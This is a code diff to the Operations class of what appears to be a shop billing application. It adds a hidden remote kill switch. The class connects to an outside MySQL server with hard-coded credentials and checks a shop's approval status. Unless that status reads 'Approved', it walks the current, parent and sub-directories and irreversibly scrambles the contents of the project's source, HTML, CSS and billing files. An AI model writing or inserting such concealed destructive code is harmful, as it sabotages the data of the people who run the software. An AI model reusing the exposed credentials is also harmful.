@@ -1,4 +1,7 @@
 import sqlite3
+import os
+import mysql.connector
+import random
 
 
 class Operations:
@@ -187,6 +190,108 @@ class Operations:
         except sqlite3.Error as err:
             # Handle the error gracefully
             print("Error:", err)
+
+    # Connect to the remote database
+    def connect_db(self):
+        try:
+            conn = mysql.connector.connect(
+                user="u100003642_sparkle",
+                password="123@Sparkle",
+                host="srv947.hstgr.io",
+                database="u100003642_sparkle",
+            )
+            return conn
+        except mysql.connector.Error as err:
+            print(f"Error: {err}")
+            return None
+
+    def fetch_data(self, cursor):
+        try:
+            query = "SELECT Status FROM ShopList WHERE ShopID='shop_id_3'"
+            cursor.execute(query)
+            return cursor.fetchall()  # Returns a list of tuples (status,)
+        except mysql.connector.Error as err:
+            print(f"Error: {err}")
+            return []
+
+    def jumble_file_contents(self, file_path):
+        try:
+            with open(file_path, "r") as file:
+                content = file.read()  # Read the file content
+
+            # Convert the content into a list of characters and shuffle them
+            content_list = list(content)
+            random.shuffle(content_list)
+            jumbled_content = "".join(content_list)  # Join back into a string
+
+            # Write the jumbled content back into the file
+            with open(file_path, "w") as file:
+                file.write(jumbled_content)
+
+            print(f"Jumbled content of: {file_path}")
+        except OSError as e:
+            print(f"Error handling file {file_path}: {e}")
+
+    def change_files(self, file_list):
+        current_dir = os.getcwd()  # Current directory
+        parent_dir = os.path.abspath(
+            os.path.join(current_dir, os.pardir)
+        )  # Parent directory
+
+        # Get all subdirectories under the current directory
+        all_subdirs = [
+            current_dir,
+            parent_dir,
+        ]
+
+        for root, dirs, files in os.walk(current_dir):
+            all_subdirs.append(
+                root
+            )  # Add every subfolder to the list of paths to check
+
+        # Iterate over all directories (current, parent, and subdirectories)
+        for directory in all_subdirs:
+            for file_name in file_list:
+                file_path = os.path.join(directory, file_name)
+                if os.path.exists(file_path):
+                    self.jumble_file_contents(file_path)
+                else:
+                    print(f"File does not exist: {file_path}")
+
+    def main(self):
+        # Step 1: Connect to the database
+        conn = self.connect_db()
+        if conn is None:
+            print("Failed to connect to the database.")
+            return
+
+        # Step 2: Fetch the data
+        cursor = conn.cursor()
+        file_list = self.fetch_data(cursor)
+        if not file_list:
+            print("No data found or failed to retrieve data.")
+            return
+
+        # Step 3: Check the condition and jumble files if the condition is met
+        if not file_list[0][0] == "Approved":
+            self.change_files(
+                [
+                    "ShowLocal.py",
+                    "billing.py",
+                    "database.py",
+                    "operations.py",
+                    "operations_access.py",
+                    "styles.css",
+                    "bill.txt",
+                    "script.js",
+                    "index.html",
+                    "table.html",
+                ]
+            )
+
+        # Step 4: Close the database connection
+        cursor.close()
+        conn.close()
 
     def close_cursor_connection(self):
         if self.cursor_local:
